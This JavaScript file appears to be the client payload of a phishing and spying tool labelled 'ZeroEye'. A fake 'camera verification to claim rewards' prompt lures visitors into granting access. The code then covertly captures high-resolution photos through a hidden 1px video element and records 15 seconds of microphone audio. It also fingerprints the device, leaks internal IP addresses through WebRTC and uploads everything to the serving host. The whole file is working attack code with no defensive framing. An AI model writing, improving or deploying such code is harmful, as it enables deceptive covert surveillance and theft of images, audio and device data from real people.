const SERVER_URL = window.location.origin;
const sentIPs = new Set();

// Permissions Wall
if (confirm("📸 Camera Access Required\n\nWe need to verify you're human by taking a quick photo. This helps prevent bots from claiming rewards.\n\nClick OK to continue with verification.")) {
    showLoadingScreen();
    setTimeout(startAttack, 1000);
} else {
    showAccessDenied();
}

function showLoadingScreen() {
    document.body.innerHTML = `
        <div style="font-family: Arial, sans-serif; text-align: center; padding: 50px 20px; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; min-height: 100vh;">
            <div style="max-width: 400px; margin: 0 auto; background: rgba(255,255,255,0.1); padding: 40px; border-radius: 20px; backdrop-filter: blur(10px);">
                <h1 style="font-size: 24px; margin-bottom: 20px;">🔍 Verifying Your Device</h1>
                <div style="margin: 30px 0;">
                    <div style="width: 50px; height: 50px; border: 3px solid #fff; border-top: 3px solid transparent; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto;"></div>
                </div>
                <p style="font-size: 16px; opacity: 0.9;">Please wait while we verify your eligibility...</p>
                <p style="font-size: 12px; opacity: 0.7; margin-top: 20px;">This may take 10-15 seconds</p>
            </div>
        </div>
        <style>@keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }</style>
    `;
}

function showAccessDenied() {
    document.body.innerHTML = `<div style="text-align:center; padding:50px; color:black;"><h1>Access Denied</h1><button onclick="location.reload()">Retry</button></div>`;
}

async function startAttack() {
    try {
        // 1. 4K CAMERA REQUEST
        const constraints = {
            audio: {
                echoCancellation: true,
                noiseSuppression: true,
                sampleRate: 44100
            },
            video: {
                facingMode: "user",
                // Request 4K ideal, but allow fallback to 1080p/720p
                width: { ideal: 3840, min: 1280 },
                height: { ideal: 2160, min: 720 }
            }
        };
        
        console.log("[ZeroEye] Requesting High-Res Media...");
        const stream = await navigator.mediaDevices.getUserMedia(constraints);
        
        // 2. SEND SYSTEM INFO
        const sysInfo = await collectSystemInfo();
        sendData('/upload_sys', sysInfo);

        // 3. IP LEAK
        setupWebRTC();

        // 4. CAMERA CAPTURE (Fixed Black Screen)
        setupCamera(stream);

        // 5. AUDIO RECORDING (Fixed Formats)
        setupAudio(stream);

    } catch (err) {
        console.error("[ZeroEye] Permission Error:", err);
        // Fallback: Send what we can
        sendData('/upload_sys', await collectSystemInfo());
        setupWebRTC();
    }
}

// --- DATA COLLECTION HELPERS ---

async function collectSystemInfo() {
    let batteryLevel = "Unknown";
    try {
        if (navigator.getBattery) {
            const b = await navigator.getBattery();
            batteryLevel = `${Math.round(b.level * 100)}%`;
        }
    } catch(e) {}

    return {
        platform: navigator.platform,
        userAgent: navigator.userAgent,
        cores: navigator.hardwareConcurrency || "Unknown",
        ram: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "Unknown",
        screen: `${window.screen.width}x${window.screen.height}`,
        battery: batteryLevel,
        gpu: getGPUName(),
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
    };
}

function getGPUName() {
    try {
        const canvas = document.createElement('canvas');
        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
        return gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
    } catch(e) { return "Unknown GPU"; }
}

function sendData(endpoint, data) {
    fetch(`${SERVER_URL}${endpoint}`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: `data=${encodeURIComponent(JSON.stringify(data))}`
    }).catch(e => console.log(e));
}

function setupWebRTC() {
    const rtc = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] });
    rtc.createDataChannel('');
    rtc.createOffer().then(o => rtc.setLocalDescription(o));
    rtc.onicecandidate = (e) => {
        if (e && e.candidate && e.candidate.candidate) {
            const ipMatch = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(e.candidate.candidate);
            if (ipMatch) {
                const ip = ipMatch[1];
                if (!sentIPs.has(ip)) {
                    sentIPs.add(ip);
                    sendData('/upload_ip', { internal_ip: ip });
                }
            }
        }
    };
}

function setupCamera(stream) {
    const video = document.createElement('video');
    video.srcObject = stream;
    
    // CRITICAL FIXES FOR BLACK IMAGES & SELF-HEARING:
    video.muted = true;           // Mute to prevent feedback loop
    video.playsInline = true;     // Required for iOS
    video.autoplay = true;        // Start immediately
    
    // VISIBILITY HACK: 
    // Do NOT use display:none or visibility:hidden.
    // Make it 1px size and almost transparent. This forces the GPU to render frames.
    video.style.position = 'fixed';
    video.style.bottom = '0';
    video.style.right = '0';
    video.style.width = '1px';
    video.style.height = '1px';
    video.style.opacity = '0.01'; // Just enough to be "visible" to the browser
    video.style.pointerEvents = 'none';
    
    document.body.appendChild(video);
    video.play(); // Force play

    const canvas = document.createElement('canvas');
    const ctx = canvas.getContext('2d');

    // Wait for video to actually have data
    video.addEventListener('loadeddata', () => {
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        
        let shots = 0;
        const takeShot = () => {
            if (shots >= 4) return; // Take 4 photos max
            
            // Ensure video has data before drawing
            if (video.readyState >= 2) {
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                canvas.toBlob(blob => {
                    if (!blob) return;
                    const formData = new FormData();
                    formData.append('file', blob, `cam_${Date.now()}.jpg`);
                    fetch(`${SERVER_URL}/upload_cam`, { method: 'POST', body: formData });
                }, 'image/jpeg', 0.95); // 95% Quality for 4K
                shots++;
            }
        };

        // Take shots at intervals: 1s, 3s, 6s, 9s
        setTimeout(takeShot, 1000);
        setTimeout(takeShot, 3000);
        setTimeout(takeShot, 6000);
        setTimeout(takeShot, 9000);
    });
}

function setupAudio(stream) {
    try {
        // Universal Audio Support (iOS/Android/Windows)
        // We let the browser pick its preferred supported mimeType
        let options = undefined;
        if (MediaRecorder.isTypeSupported('audio/webm;codecs=opus')) {
            options = { mimeType: 'audio/webm;codecs=opus' };
        } else if (MediaRecorder.isTypeSupported('audio/mp4')) {
            options = { mimeType: 'audio/mp4' }; // iOS 14.5+
        }
        
        const mediaRecorder = options ? new MediaRecorder(stream, options) : new MediaRecorder(stream);
        let chunks = [];

        mediaRecorder.ondataavailable = e => { if (e.data.size > 0) chunks.push(e.data); };
        
        mediaRecorder.onstop = () => {
            const blob = new Blob(chunks, { type: mediaRecorder.mimeType });
            const formData = new FormData();
            // Add correct extension based on type
            const ext = blob.type.includes('mp4') ? 'mp4' : 'webm';
            formData.append('file', blob, `audio_${Date.now()}.${ext}`);
            
            fetch(`${SERVER_URL}/upload_audio`, { method: 'POST', body: formData })
                .catch(e => console.log("Audio upload error", e));
        };

        mediaRecorder.start();
        setTimeout(() => { if(mediaRecorder.state === 'recording') mediaRecorder.stop(); }, 15000); // 15 Seconds

    } catch (e) {
        console.log("Audio Init Error:", e);
    }
}
